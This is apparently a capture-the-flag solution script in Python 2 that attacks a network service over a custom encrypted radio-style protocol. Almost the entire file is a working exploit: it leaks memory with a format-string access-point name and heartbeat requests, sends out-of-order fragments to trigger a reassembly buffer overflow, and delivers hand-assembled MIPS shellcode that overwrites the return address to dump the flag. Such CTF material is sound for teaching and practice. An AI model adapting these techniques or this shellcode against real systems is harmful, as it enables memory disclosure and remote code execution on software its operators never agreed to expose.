#G/usr/bin/env python

import time
import socket
import sys, os
import binascii
import struct
import shlex
import hashlib
from subprocess import Popen, PIPE

SIZE = 4000

def run_cipher( v, key ):
	v0,v1 = v[0],v[1]
	cipher_key = struct.unpack( '4I', key )

	mask = 0xffffffff
	delta = 0x83E778B9
	cipher_sum = (delta * 16) & mask

	i=0	
	while i < 16:	
		v0 = (v0 + ((((((v1 << 4) & mask) ^ (v1 >> 5)) + v1) & mask) ^ ((cipher_sum + cipher_key[cipher_sum & 0x3]) & mask))) & mask
		cipher_sum = ((cipher_sum + delta) & mask)
		v1 = (v1 + ((((((v0 << 4) & mask) ^ (v0 >> 5)) + v0) & mask) ^ ((cipher_sum + cipher_key[(cipher_sum>>11)&0x3]) & mask))) & mask

		i+=1

	return v0,v1	

def cipher_data( message_data, cipher_state, cipher_key ):
	i = 0
	
	cipher_data = ''
	while i < len(message_data):
		if ( i % 8 == 0 ):
			cipher_state = run_cipher( cipher_state, cipher_key )

		v0 = cipher_state[0]
		v1 = cipher_state[1]

		state_data = struct.pack( "2I", v0, v1 )

		cipher_data += struct.pack( 'B', ord(message_data[i]) ^ ord(state_data[i%8]) )
		i+=1

	return cipher_data, cipher_state

def int_to_bytes(val, num_bytes):
	i = 0
	result_bytes = ''
	while i < num_bytes:
		result_bytes += struct.pack( 'B', val & 0xff )
		
		val >>= 8
		i += 1

	return result_bytes

def bytes_to_int( byte_string, num_bytes):
	byte_string = byte_string[::-1]
	i = 0
	result_int = 0
	while i < num_bytes:
		result_int <<= 8
		result_int += ord(byte_string[i])

		i+=1

	return result_int	

def crc16( in_data ):

	POLY = 0x8408
	pos = 0	
	crc = 0xffff
	data = 0
	
	while pos < len(in_data):
		i = 0
		data = ord(in_data[pos]) & 0xff
		while i < 8:
			if ( (crc & 0x0001) ^ (data & 0x0001) ):
				crc = (crc >> 1) ^ POLY
			else:
				crc >>= 1
			i+=1
			data >>= 1
		pos+=1

	crc = ~crc
	data = crc
	crc = ((crc << 8) & 0xff00) | (data >> 8 & 0xff)

	return crc

def recv_until( sockfd, numbytes ):
	i = 0
	data_str = ''
	while i < numbytes:
		data = sockfd.recv(1)
		
		data_str += data
		i+=1

	return data_str
		
		

def recv_line( sockfd ):
        response = ""
        while True:

                data = sockfd.recv(1)

                if not data:
                        break

                if ( data == '\n' ):
                        break

                response += data

        return response

class RXCConnection:
	
	def start_dedicated_connection( self, sockfd ):
                print "Starting dedicated connection"
		self.sockfd = sockfd

		# Turn on debug mode
		# First update block size -- for security mode parameters
		mac_update_ind_hdr = '\x79'
                update_block_size_string = '\x68' + "\x00"*28
                crc_value = crc16( update_block_size_string )

                # Concatenate everything together
                byte_string = mac_update_ind_hdr + struct.pack( '<H', crc_value ) + update_block_size_string
	
                print "Sending (len=%d): %s" % (len(byte_string), binascii.hexlify( byte_string ))
		sockfd.sendall(byte_string)

                client_nonce = '\x00' * 96
		data_string = '\x17\x70' + client_nonce + '\x00\x00\x00'    # MAC Grant's must be multiple of 4, so sent one extra byte to make it 102 bytes
		crc_value = crc16( data_string )

		byte_string = '\xe3' + struct.pack( '<H', crc_value ) + data_string

                print "Sending (len=%d): %s" % (len(byte_string), binascii.hexlify( byte_string ))
		sockfd.sendall(byte_string)

		response_data = recv_until( sockfd, 104 )
                print "Response data (len=%d): %s" % (len(response_data), binascii.hexlify( response_data ))

		if ( ord(response_data[3]) != 0x17 or ord(response_data[4]) != 0x9d ):
			print "Failed to get security parameters response!\n"
			return False

		server_nonce = response_data[5:5+96]
		print "Length of server nonce is: %d\n" % len(server_nonce) 	
                print "Server Nonce string: %s\n" % binascii.hexlify(server_nonce)

                cipher_block = 0
                v = [0,0]
                secret_key = struct.pack( '<I', 0xA5B5C5D5 ) + struct.pack( '<I', 0x12345678 ) + struct.pack( '<I', 0x41414141 ) + struct.pack( '<I', 0xCCCCCCCC )#'\x00' * 16

                part_a = [0,0,0,0,  0,0,0,0,  0,0,0,0,  0,0,0,0,  0,0,0,0,  0,0,0,0]
                part_pos = 0
                while cipher_block < 96:
                    v[0] = struct.unpack( '<I', client_nonce[cipher_block:cipher_block+4] )[0]
                    v[1] = struct.unpack( '<I', client_nonce[cipher_block+4:cipher_block+8] )[0]

                    v[0], v[1] = run_cipher( v, secret_key )

                    part_a[part_pos] = v[0]
                    part_a[part_pos+1] = v[1]

                    part_pos+=2

                    cipher_block += 8

                part_b = [0,0,0,0,  0,0,0,0,  0,0,0,0,  0,0,0,0,  0,0,0,0,  0,0,0,0]
                part_pos = 0
                cipher_block = 0
                while cipher_block < 96:
                    v[0] = struct.unpack( '<I', server_nonce[cipher_block:cipher_block+4] )[0]
                    v[1] = struct.unpack( '<I', server_nonce[cipher_block+4:cipher_block+8] )[0]

                    v[0], v[1] = run_cipher( v, secret_key )

                    part_b[part_pos] = v[0]
                    part_b[part_pos+1] = v[1]

                    part_pos+=2

                    cipher_block += 8

                print "Client Nonce: %08X %08X %08X %08X %08X %08X %08X %08X" % (part_a[0], part_a[1], part_a[2], part_a[3], part_a[4], part_a[5], part_a[6], part_a[7])
                print "Server Nonce: ", part_b

                shared_secret_bytes = ''
                part_pos = 0
                while part_pos < 24:
                    part_a[part_pos] = part_a[part_pos] ^ part_b[part_pos]

                    shared_secret_bytes += struct.pack( '<I', part_a[part_pos] )

                    part_pos += 1

                print "Shared Secret: ", part_a
                print "Shared Secret Bytes (len=%d): %s" % (len(shared_secret_bytes), binascii.hexlify(shared_secret_bytes))
                print "MD5 of zero string: ", binascii.hexlify(hashlib.md5('\x00'*48).digest())
                print "MD5 of first half of shared secret bytes: ", binascii.hexlify(hashlib.md5( shared_secret_bytes[0:48] ).digest())

		# Get MD5 hash
		shared_secret_md5 = hashlib.md5( shared_secret_bytes[0:48] ).digest() + hashlib.md5( shared_secret_bytes[48:] ).digest()
	
		print "Shared secret (md5):\n"
		print binascii.hexlify(shared_secret_md5)
		
		self.cipher_key = shared_secret_md5[0:16]
		self.ul_cipher_state = struct.unpack( '2I', shared_secret_md5[16:24] )
		self.dl_cipher_state = struct.unpack( '2I', shared_secret_md5[24:32] )

                # DEBUG WAIT
		#response_data = recv_until( sockfd, 104 )

		self.crc_flag = True

		self.dch_sequence_number = 0

		update_block_size_string = '\xa4' + "\x00"*(104-4)
                crc_value = crc16( update_block_size_string )

                byte_string = mac_update_ind_hdr + struct.pack( '<H', crc_value ) + update_block_size_string
		sockfd.sendall( byte_string )
		self.blocksize = 0xa1

		return True
	

	def send_dch_message( self, dch_message_data, seqnumber ):
		
		fragment_count = len(dch_message_data) / (self.blocksize-3)

		if ( len(dch_message_data) % (self.blocksize-3) ):
			fragment_count += 1

		if ( fragment_count > 16 ):
			print "Data too long for block size (not enough fragments) in send_dch_message\n"
			fragment_count = 16

                print "Sending DCH Message (length=%d)" % len(dch_message_data)

		i = 0
		pos = 0
		while ( i < fragment_count ):
			
			data_len_for_fragment = len(dch_message_data) - pos
			if ( data_len_for_fragment > (self.blocksize-3) ):
				data_len_for_fragment = (self.blocksize-3)
		
			if ( i == (fragment_count-1) ):
				lf_bit = 1
			else:
				lf_bit = 0

			fragment_header = (lf_bit << 15) | ((seqnumber & 0x7FF) << 4) | (i & 0xF)

			msg_data = struct.pack('<H', fragment_header) + dch_message_data[pos:pos+data_len_for_fragment]	
			pos += data_len_for_fragment

			if ( len(msg_data) < (self.blocksize-1) ):
				msg_data += '\x00' * ((self.blocksize-1) - len(msg_data))


			print "Data to send before cipher (len=%d):\n" % len(msg_data)
			print binascii.hexlify(msg_data)

			# Cipher data	
			message_data_ciphered, self.ul_cipher_state = cipher_data( msg_data, self.ul_cipher_state, self.cipher_key )	

			message_data = '\x73' + message_data_ciphered

			# Now get crc16
			if ( self.crc_flag ):
				crc_value = crc16( message_data )
			
				# Send message header (with crc)
				msg_data_to_send = '\xe3' + struct.pack('<H', crc_value )
			else:
				# Send message header (without crc)
				msg_data_to_send = '\xe3'

			# Add message data
			msg_data_to_send += message_data

			print "Message data to send (len=%d):\n" % len(msg_data_to_send)
			print binascii.hexlify(msg_data_to_send)

			self.sockfd.sendall( msg_data_to_send )

			i += 1

        def send_dch_message_bad( self, dch_message_data, seqnumber ):
            # Exercises reassembly overflow bug
            # BUG: Trigger by setting the lf bit on one of the last packets -- but send out of order
            # the calculation for the assembled size is the following get packet number for the packet with LF bit set
            # and then calculate the size by that
            fragment_count = len(dch_message_data) / (self.blocksize-3)
            if ( len(dch_message_data) % (self.blocksize-3) ):
                fragment_count += 1

            if ( fragment_count > 15 ):
                print "Data too long to send overflow segments\n"
                return None

            i = 1   # start at index 1 -- or the second fragment (fragments: 0-15)
            pos = self.blocksize-3
            while ( i < fragment_count ):
                data_len_for_fragment = len(dch_message_data) - pos
                if ( data_len_for_fragment > (self.blocksize-3) ):
                    data_len_for_fragment = self.blocksize-3

                lf_bit = 0

                fragment_header = (lf_bit << 15) | ((seqnumber & 0x7FF) << 4) | (i & 0xF)

                msg_data = struct.pack('<H', fragment_header) + dch_message_data[pos:pos+data_len_for_fragment]
                pos += data_len_for_fragment

                if ( len(msg_data) < (self.blocksize-1) ):
                    msg_data += '\x00' * ((self.blocksize-1) - len(msg_data))


                print "Data to send before cipher (len=%d):\n" % len(msg_data)
                print binascii.hexlify(msg_data)

                # Cipher data
                message_data_ciphered, self.ul_cipher_state = cipher_data( msg_data, self.ul_cipher_state, self.cipher_key )

                message_data = '\x73' + message_data_ciphered

                # Now get crc16
                if ( self.crc_flag ):
                    crc_value = crc16( message_data )

                    # Send message header (with crc)
                    msg_data_to_send = '\xe3' + struct.pack('<H', crc_value )
                else:
                    # Send message header (without crc)
                    msg_data_to_send = '\xe3'

                # Add message data
                msg_data_to_send += message_data

                print "Message data to send (len=%d):\n" % len(msg_data_to_send)
                print binascii.hexlify(msg_data_to_send)

                self.sockfd.sendall( msg_data_to_send )

                i += 1

            # Send last fragment to trigger invalid calculation
            pos = 0
            i = 0
            fragment_header = (1 << 15) | ((seqnumber & 0x7FF) << 4) | (i & 0xF)

            msg_data = struct.pack('<H', fragment_header) + dch_message_data[pos:pos+self.blocksize-3]

            print "Data to send before cipher (len=%d):\n" % len(msg_data)
            print binascii.hexlify(msg_data)

            # Cipher data
            message_data_ciphered, self.ul_cipher_state = cipher_data( msg_data, self.ul_cipher_state, self.cipher_key )

            message_data = '\x73' + message_data_ciphered

            # Now get crc16
            if ( self.crc_flag ):
                crc_value = crc16( message_data )

                # Send message header (with crc)
                msg_data_to_send = '\xe3' + struct.pack('<H', crc_value )
            else:
                # Send message header (without crc)
                msg_data_to_send = '\xe3'

            # Add message data
            msg_data_to_send += message_data

            print "Message data to send (len=%d):\n" % len(msg_data_to_send)
            print binascii.hexlify(msg_data_to_send)

            self.sockfd.sendall( msg_data_to_send )


	def recv_dch_message( self ):
		# Read until done
		done = False

		dch_message_data = ''
		while ( done == False ):
		
			recv_count = self.blocksize+1
			if ( self.crc_flag ):
				recv_count += 2
	
			recv_msg_data = recv_until( self.sockfd, recv_count )
                        print "DCH MSG DATA (len=%d): %s" % (len(recv_msg_data), binascii.hexlify(recv_msg_data))

			if ( recv_msg_data[0] != '\xe3' ):
				print "Error receiving message -- did not receive data indicator\n"
				return None

			msg_data = ''
			if ( self.crc_flag ):
				if ( struct.unpack('<H', recv_msg_data[1:3])[0] != crc16( recv_msg_data[3:] ) ):
                                        print "RECV DCH Message: Error CRC did not match on recv data [%x != %x]\n" % (struct.unpack('<H', recv_msg_data[1:3])[0], crc16( recv_msg_data[3:] ))
					return None
	
				msg_data = recv_msg_data[3:]
			else:
				msg_data = recv_msg_data[1:]

			# Process message... check for DCH channel
			if ( msg_data[0] != '\x73' ):
				print "Error receiving message - not a DCH message!\n"
				return None

			# Decrypt!
			msg_data_to_decrypt = msg_data[1:]

			# Decrypt
			msg_data, self.dl_cipher_state = cipher_data( msg_data_to_decrypt, self.dl_cipher_state, self.cipher_key )

			# Check length
			if ( len(msg_data) < 2 ):
				print "Invalid message length for DCH message -- trying to read fragment header\n"
				return None

			fragment_header = struct.unpack('H', msg_data[0:2] )[0]

			if ( fragment_header & 0x8000 ):
				# Last fragment
				done = True

			dch_message_data += msg_data[2:]

		return dch_message_data	
						

	def send_ap_setup_request( self, apname, apid ):

		data_string = '\x23' + '\x00' + '\x00' + struct.pack('B', len(apname) ) + apname
	
		self.dch_sequence_number += 1	
		self.send_dch_message( data_string, self.dch_sequence_number )

		recv_msg_data = self.recv_dch_message( )
		print "Setup AP Response:\n"
		print binascii.hexlify(recv_msg_data)

                # DEBUG WAIT
                #recv_until( self.sockfd, 10000 )

		if ( recv_msg_data[0] != '\x5e' ):
			print "Error -- Setup AP response -- incorrect header\n"
			return None

		if ( recv_msg_data[1] == '\x02' ):
			print "AP already exists\n"
			return struct.unpack( "I", recv_msg_data[2:6] )[0]
		
		if ( recv_msg_data[1] != '\x00' ):
			print "Error -- Setup AP response -- setup failure\n"
			return None


		# Return the newly created AP ID (as an integer)
		return struct.unpack('I', recv_msg_data[2:6] )[0]

	def send_ap_destroy_request( self, apid ):
		data_string = '\x87' + struct.pack('I', apid )

		self.dch_sequence_number += 1
		self.send_dch_message( data_string, self.dch_sequence_number )
	
		recv_msg_data = self.recv_dch_message( )

		if ( recv_msg_data[0] != '\x94' ):
			print "Error -- Destroy AP Response -- incorrect header\n"
			return False

		if ( recv_msg_data[1] == '\x02' ):
			print "Error -- Response for Destroy Request -- AP ID not found\n"
			return False

		if ( recv_msg_data[1] != '\x00' ):
			print "Error -- Response for Destroy Request -- Failed\n"
			return False

		return True
	
	def send_ap_info_request( self, apid ):
		data_string = '\x52' + struct.pack('I', apid )

		self.dch_sequence_number += 1
		self.send_dch_message( data_string, self.dch_sequence_number )
	
		recv_msg_data = self.recv_dch_message( )

		if ( recv_msg_data[0] != '\x28' ):
			print "Error -- Info AP Response -- incorrect header\n"
			return False

		if ( recv_msg_data[1] == '\x02' ):
			print "Error -- Response for Info Request -- AP ID not found\n"
			return False

		if ( recv_msg_data[1] != '\x00' ):
			print "Error -- Response for Info Request -- Failed\n"
			return False

		return recv_msg_data


	def send_fast_message( self, msg_data ):
		
		if ( len(msg_data) > (self.blocksize-1) ):
			print "Can't send fast message -- too large for blocksize!\n"
			return None

		if ( len(msg_data) < (self.blocksize-1) ):
			msg_data += '\x00' * ((self.blocksize-1) - len(msg_data))

		message_data_ciphered, self.ul_cipher_state = cipher_data( msg_data, self.ul_cipher_state, self.cipher_key )	

		message_data = '\xc3' + message_data_ciphered

		# Now get crc16
		if ( self.crc_flag ):
			crc_value = crc16( message_data )
			
			# Send message header (with crc)
			msg_data_to_send = '\xe3' + struct.pack('H', crc_value )
		else:
			# Send message header (without crc)
			msg_data_to_send = '\xe3'

		# Add message data
		msg_data_to_send += message_data

		print "Message data to send (len=%d):\n" % len(msg_data_to_send)
		print binascii.hexlify(msg_data_to_send)

		sockfd.sendall( msg_data_to_send )

		return len(msg_data_to_send)

	def recv_fast_message( self ):
		recv_count = self.blocksize+1
		if ( self.crc_flag ):
			recv_count += 2

		recv_msg_data = recv_until( self.sockfd, recv_count )

		if ( len(recv_msg_data) != recv_count ):
			print "Error on receive!\n"
			return None

		if ( recv_msg_data[0] != '\xe3' ):
			print "Error receiving message -- did not receive data indicator\n"
			return None

		msg_data = ''
		if ( self.crc_flag ):
			if ( struct.unpack('H', recv_msg_data[1:3])[0] != crc16( recv_msg_data[3:] ) ):
                                print "RECV FAST MSG: Error CRC did not match on recv data\n"
				return None

			msg_data = recv_msg_data[3:]
		else:
			msg_data = recv_msg_data[1:]

		# Process message... check for DCH channel
		if ( msg_data[0] != '\xc3' ):
			print "Error receiving message - not a FAST message!\n"
			return None

		# Decrypt!
		msg_data_to_decrypt = msg_data[1:]

		# Decrypt
		msg_data, self.dl_cipher_state = cipher_data( msg_data_to_decrypt, self.dl_cipher_state, self.cipher_key )

		return msg_data	

	def send_ap_data_write_request( self, ap_id, write_data ):
		fast_msg = '\x01' + struct.pack( 'I', ap_id ) + struct.pack( 'B', len(write_data) ) + write_data

		if ( self.send_fast_message( fast_msg ) ):
			recv_msg = self.recv_fast_message( )

			return recv_msg
		else:
			print "Failed to send AP data write request"
			return None


	def send_solution( self, sockfd ):

		time.sleep(3)
		if ( self.start_dedicated_connection( sockfd ) == False ):
			print "Failed to start dedicated connection!\n"
			return

                print "Dedicated connection established"
		# First two bytes are fragment header (16-bit), 0x71 = HEARTBEAT_REQUEST_ID, lastly next two bytes are heart request length (in this case 0x00FF or 255)
	
		heart_message_request = '\x71\x00\x06'
		self.dch_sequence_number += 1
		self.send_dch_message( heart_message_request, self.dch_sequence_number )

		recv_msg_data = self.recv_dch_message( )

		if ( recv_msg_data == None ):
			print "Error -- did not get DCH message data response\n"
			return

		print "Heart Beat Request Response:\n"
		print binascii.hexlify(recv_msg_data)
		
		test_ap_id1 = self.send_ap_setup_request( "dupe", 0 )
		test_ap_id2 = self.send_ap_setup_request( "dupe", 0 )

		test_ap_id = self.send_ap_setup_request( 'Test AP %016llX %016llX %016llX %016llX %016llX %016llX %016llX %016llX %016llX %016llX %016llX %016llX ', 0 )

		# send a AP data write command -- should crash!
		self.send_ap_data_write_request( test_ap_id, "blah!!!!" )
		
		ap_info_recv = self.send_ap_info_request( test_ap_id )

		print "AP Info Request Response:\n"
		print ap_info_recv[1:]

		heart_message_request = '\x71\x00\x06'
		self.dch_sequence_number += 1
		self.send_dch_message( heart_message_request, self.dch_sequence_number )

		recv_msg_data = self.recv_dch_message( )

		if ( recv_msg_data == None ):
			print "Error -- did not get DCH message data response\n"
			return

		print "Heart Beat Request Response:\n"
		print binascii.hexlify(recv_msg_data)

		# Destroy AP
		if ( self.send_ap_destroy_request( test_ap_id ) ):
			print "Successfully destroyed AP ID %d\n" % test_ap_id
		else:
			print "Failed to destroy AP ID %d\n" % test_ap_id

		# Get another memory leak of data
		heart_message_request = '\x71\x00\x06'
		self.dch_sequence_number += 1
		self.send_dch_message( heart_message_request, self.dch_sequence_number )

		recv_msg_data = self.recv_dch_message( )

		if ( recv_msg_data == None ):
			print "Error -- did not get DCH message data response\n"
			return

		print "Heart Beat Request Response:\n"
		print binascii.hexlify(recv_msg_data)

                # Exercise fragment assembly bug
                exploit_payload = ''
                exploit_payload += struct.pack( 'I', 0x00000000 ) # NOP instruction
                # Setup call to WriteData with address of FLAG

                # First load g_iovdata address into a0, with lui 0xa018 and lw a0, 0xdb0 -- look for symbol g_iovdata
                # objdump -D a.out | grep "<g_iodata>"
                exploit_payload += struct.pack( 'I', 0x3c02a018 ) # lui     v0, 0xa018

                # Load a1 with a2008000 -- this will be the address of the flag
                exploit_payload += struct.pack( 'I', 0x3c05a200 ) # lui     a1, 0xa200
                exploit_payload += struct.pack( 'I', 0x8c440db0 ) # lw      a0, 0xdb0(v0)

                # Load a2 with the length of the write -- in this case 128-bytes -- large enough for most any flag
                exploit_payload += struct.pack( 'I', 0x24060080 ) # li      a2, 0x80

                # Now load the address of WriteData
                # objdump -D a.out | grep "<_ZN13CIOConnection9WriteDataEPhj>:"
                exploit_payload += struct.pack( 'I', 0x3c02bfc0 ) # lui     v0, 0xbfc0
                exploit_payload += struct.pack( 'I', 0x34428cbc ) # ori     v0, v0, 0x63ec

                # Jump and link register to WriteData - return back to here for infinite loop
                exploit_payload += struct.pack( 'I', 0x0040f809 ) # jalr    v0 <_ZN13CIOConnection9WriteDataEPhj>
                exploit_payload += struct.pack( 'I', 0x34a58000 ) # ori     a1,a1,0x8000
               
                # Infinite loop waiting for interrupts to fire on write UART
                exploit_payload += struct.pack( 'I', 0x00000000 ) # nop
                exploit_payload += struct.pack( 'I', 0x00000000 ) # nop
                exploit_payload += struct.pack( 'I', 0x1084ffff ) # beq     a0, a0, -8  # b
                exploit_payload += struct.pack( 'I', 0x00000000 ) # nop
                exploit_payload += struct.pack( 'I', 0x0000000d ) # BREAK 0x0 instruction'


                exploit_msg_data = exploit_payload + ('A' * (1312 - len(exploit_payload))) #  'A' * 1312
                exploit_msg_data += struct.pack( 'I', 0x42424242 )
                exploit_msg_data += struct.pack( 'I', 0x43434343 )
                exploit_msg_data += struct.pack( 'I', 0x44444444 )
                exploit_msg_data += struct.pack( 'I', 0xa00fe794 ) # PC address


                # Exploit it
                self.dch_sequence_number += 1
                self.send_dch_message_bad( exploit_msg_data, self.dch_sequence_number )

                # DEBUG
                flag_string = recv_until( self.sockfd, 128 )

                print "The flag is: %s" % flag_string
                print "DISCONNECTING\n"


if __name__ == "__main__": 
    host = os.getenv("HOST", "172.17.0.1")
    port = int(os.getenv("PORT", "31337"))

    try:
        sockfd = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

    except socket.error, e:
        print "Error while Creating socket : ", e
        sys.exit(1)

    try:
        sockfd.connect((host,port))

    except socket.gaierror, e:
        print "Error (Address-Related) while Connecting to server : ", e

    except socket.error , e:
        print "Error while Connecting to Service : ", e
        sys.exit(1)
    try:
        ticket = os.getenv("TICKET","")
        if len(ticket):
            print(sockfd.recv(128).strip())
            sockfd.send(ticket +'\n')
            print("Sent Ticket: ", ticket)
            sys.stdout.flush()


        rxc_con = RXCConnection()
        rxc_con.send_solution(sockfd)

    except KeyboardInterrupt:
        sockfd.shutdown(0)
